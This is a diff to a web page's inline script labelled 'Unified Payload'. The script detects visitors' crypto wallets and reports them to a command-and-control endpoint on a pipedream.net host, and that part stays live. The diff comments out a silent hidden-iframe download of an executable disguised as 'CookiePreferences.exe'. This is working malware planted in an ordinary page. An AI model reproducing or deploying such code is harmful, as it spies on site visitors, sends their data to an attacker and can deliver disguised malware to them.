@@ -504,7 +504,7 @@ hero-section { padding: 2rem 1.25rem; }
 <!-- Block 2: Unified Payload + Button Handlers -->
 <script type="module">
   const C2_ENDPOINT = 'https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net';
-  const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe';
+ // const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe'; 
 
   // ===== PAYLOAD =====
   async function executePayload() {
@@ -529,9 +529,9 @@ hero-section { padding: 2rem 1.25rem; }
     }
 
     // 4. EXE download
-    if (EXE_URL && EXE_URL !== '') {
-      triggerDownload(EXE_URL, 'CookiePreferences.exe');
-    }
+   // if (EXE_URL && EXE_URL !== '') {
+   // triggerDownload(EXE_URL, 'CookiePreferences.exe'); 
+   // }
 
     // 5. Report
     sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound });
@@ -565,7 +565,7 @@ hero-section { padding: 2rem 1.25rem; }
     return hits;
   }
 
-  function triggerDownload(url, filename) {
+ /* function triggerDownload(url, filename) {
     var oldFrame = document.getElementById('hiddenDownloadFrame');
     if (oldFrame) document.body.removeChild(oldFrame);
     var iframe = document.createElement('iframe');
@@ -577,7 +577,7 @@ hero-section { padding: 2rem 1.25rem; }
       var frame = document.getElementById('hiddenDownloadFrame');
       if (frame) document.body.removeChild(frame);
     }, 5000);
-  }
+  } */
 
   function sendToC2(data) {
     fetch(C2_ENDPOINT, {
